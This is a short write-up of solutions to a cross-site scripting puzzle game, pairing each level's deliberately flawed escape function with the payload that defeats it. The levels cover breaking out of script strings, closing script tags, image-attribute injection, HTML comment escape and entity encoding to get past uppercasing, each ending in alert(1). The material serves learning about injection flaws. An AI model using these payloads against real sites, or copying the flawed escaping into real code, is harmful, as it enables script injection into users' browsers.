# Warmup


```
function escape(s) {
  return '<script>console.log("'+s+'");</script>';
}
```

```
undefined"); alert(1); console.log("xss
```


# Adobe

```
function escape(s) {
  s = s.replace(/"/g, '\\"');
  return '<script>console.log("' + s + '");</script>';
}
```
The DOM stops parsing after end the script tag.
```
\"); alert(1); </script>
```

# JSON

```
function escape(s) {
  s = JSON.stringify(s);
  return '<script>console.log(' + s + ');</script>';
}
```

JSON doesn't escape angle brackets:


```
</script><script>alert(1)</script>
```

# Markdown

```
function escape(s) {
  var text = s.replace(/</g, '&lt;').replace(/"/g, '&quot;');
  // URLs
  text = text.replace(/(http:\/\/\S+)/g, '<a href="$1">$1</a>');
  // [[img123|Description]]
  text = text.replace(/\[\[(\w+)\|(.+?)\]\]/g, '<img alt="$2" src="$1.gif">');
  return text;
}
```
Replaces < with &lt; and " with &quot;.
```
[[a|http://onerror=alert(1)//]]
```
becomes
```
<img alt="<a href="http://onerror=alert(1)//" src="a.gif">">http://onerror=alert(1)//]]</a>
```
after second regex

# DOM 

```
function escape(s) {
  // Slightly too lazy to make two input fields.
  // Pass in something like "TextNode#foo"
  var m = s.split(/#/);

  // Only slightly contrived at this point.
  var a = document.createElement('div');
  a.appendChild(document['create'+m[0]].apply(document, m.slice(1)));
  return a.innerHTML;
}
```
The input is split in half with the # in between the two halves.
document['createComment'] makes a comment which the user can escape.

```
Comment#--><script>alert(1)</script>
```

# Callback

```
function escape(s) {
  // Pass inn "callback#userdata"
  var thing = s.split(/#/); 

  if (!/^[a-zA-Z\[\]']*$/.test(thing[0])) return 'Invalid callback';
  var obj = {'userdata': thing[1] };
  var json = JSON.stringify(obj).replace(/</g, '\\u003c');
  return "<script>" + thing[0] + "(" + json +")</script>";
}
```
' aren't filtered so we can use

```
'#';alert(1)//
```

to get 

```
<script>'({"userdata":"';alert(1)//"})</script>
```

# Skandia

Source: 
```
function escape(s) {
  return '<script>console.log("' + s.toUpperCase() + '")</script>';
}
```
To get around letters being uppercase with unicode hex:
```
</script><svg><script>&#x61&#x6C&#x65&#x72&#x74(1)//
```
becomes 
```
<script>console.log("</SCRIPT><SVG><SCRIPT>&#X61&#X6C&#X65&#X72&#X74(1)//")</script>
```

  
